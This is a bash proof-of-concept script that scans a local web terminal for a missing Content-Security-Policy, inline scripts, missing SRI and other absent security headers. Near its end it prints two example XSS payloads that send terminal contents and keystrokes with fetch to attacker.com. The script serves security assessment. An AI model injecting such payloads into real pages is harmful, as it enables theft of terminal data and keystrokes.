#!/bin/bash

# POC: Missing Content Security Policy and Inline Scripts Vulnerability
# This script demonstrates the absence of CSP protection and the presence of inline scripts
# that allow arbitrary JavaScript injection via XSS attacks

TARGET_URL="http://localhost:22222"
RESPONSE_FILE="/tmp/csp_response.txt"
HTML_FILE="/tmp/terminal.html"

echo "[*] Testing for Missing Content-Security-Policy and Inline Scripts"
echo "[*] Target: $TARGET_URL"
echo ""

# Fetch the HTTP response headers and body
echo "[*] Fetching HTTP response..."
curl -s -i "$TARGET_URL" > "$RESPONSE_FILE" 2>&1

# Extract headers and body
HEADERS=$(head -n 20 "$RESPONSE_FILE")
echo "[+] Response Headers:"
echo "$HEADERS"
echo ""

# Check for Content-Security-Policy header
echo "[*] Checking for Content-Security-Policy header..."
if grep -qi "Content-Security-Policy" "$RESPONSE_FILE"; then
    echo "[-] CSP header found (unexpected)"
    CSP_FOUND=1
else
    echo "[+] VULNERABILITY: No Content-Security-Policy header detected"
    CSP_FOUND=0
fi
echo ""

# Extract HTML body and check for inline scripts
echo "[*] Extracting HTML body and checking for inline scripts..."
tail -n +12 "$RESPONSE_FILE" > "$HTML_FILE" 2>/dev/null

# Count inline script tags
INLINE_SCRIPTS=$(grep -o "<script[^>]*>" "$HTML_FILE" | grep -v "src=" | wc -l)
echo "[*] Found $INLINE_SCRIPTS inline <script> tags (without src attribute)"

# Check for specific vulnerable patterns
echo ""
echo "[*] Checking for vulnerable JavaScript patterns..."

if grep -q "new Terminal()" "$HTML_FILE"; then
    echo "[+] VULNERABILITY: Found 'new Terminal()' instantiation in inline script"
fi

if grep -q "WebSocket" "$HTML_FILE"; then
    echo "[+] VULNERABILITY: Found WebSocket connection code in inline script"
fi

if grep -q "socket\.onmessage" "$HTML_FILE"; then
    echo "[+] VULNERABILITY: Found WebSocket message handler in inline script"
fi

if grep -q "term\.onData" "$HTML_FILE"; then
    echo "[+] VULNERABILITY: Found terminal data handler in inline script"
fi

# Check for external scripts without SRI
echo ""
echo "[*] Checking for external scripts without Subresource Integrity (SRI)..."
EXTERNAL_SCRIPTS=$(grep -o '<script[^>]*src="[^"]*"[^>]*>' "$HTML_FILE")
if [ ! -z "$EXTERNAL_SCRIPTS" ]; then
    echo "[+] Found external scripts:"
    echo "$EXTERNAL_SCRIPTS" | while read line; do
        if ! echo "$line" | grep -q "integrity="; then
            echo "  [-] NO SRI: $line"
        else
            echo "  [+] Has SRI: $line"
        fi
    done
fi

# Check for other missing security headers
echo ""
echo "[*] Checking for other missing security headers..."
MISSING_HEADERS=0

if ! grep -qi "X-Frame-Options" "$RESPONSE_FILE"; then
    echo "[+] VULNERABILITY: Missing X-Frame-Options header"
    ((MISSING_HEADERS++))
fi

if ! grep -qi "X-Content-Type-Options" "$RESPONSE_FILE"; then
    echo "[+] VULNERABILITY: Missing X-Content-Type-Options header"
    ((MISSING_HEADERS++))
fi

if ! grep -qi "Strict-Transport-Security" "$RESPONSE_FILE"; then
    echo "[+] VULNERABILITY: Missing Strict-Transport-Security header"
    ((MISSING_HEADERS++))
fi

# Demonstrate XSS injection risk
echo ""
echo "[*] Demonstrating XSS injection risk with missing CSP..."
echo "[*] An attacker could inject malicious script like:"
echo ""
echo "    <script>"
echo "      // Steal terminal buffer contents"
echo "      let terminalData = term.buffer.getLine(0).translateToString();"
echo "      fetch('http://attacker.com/steal?data=' + btoa(terminalData));"
echo "    </script>"
echo ""
echo "[*] Or establish a keylogger:"
echo ""
echo "    <script>"
echo "      term.onData(e => {"
echo "        fetch('http://attacker.com/log?key=' + btoa(e));"
echo "      });"
echo "    </script>"
echo ""

# Summary
echo ""
echo "====== VULNERABILITY SUMMARY ======"
if [ $CSP_FOUND -eq 0 ] && [ $INLINE_SCRIPTS -gt 0 ]; then
    echo "[!] CRITICAL: Application vulnerable to XSS code injection"
    echo "[!] - Missing Content-Security-Policy header"
    echo "[!] - $INLINE_SCRIPTS inline script(s) without CSP protection"
    echo "[!] - External scripts loaded without SRI hashes"
    echo "[!] - $MISSING_HEADERS additional security headers missing"
    echo ""
    echo "[!] RISK: Any XSS vulnerability becomes immediately exploitable"
    echo "[!] RISK: Attacker can steal terminal data, create keyloggers, exfiltrate sensitive data"
    exit 0
else
    echo "[-] Could not confirm vulnerability (check target availability)"
    exit 1
fi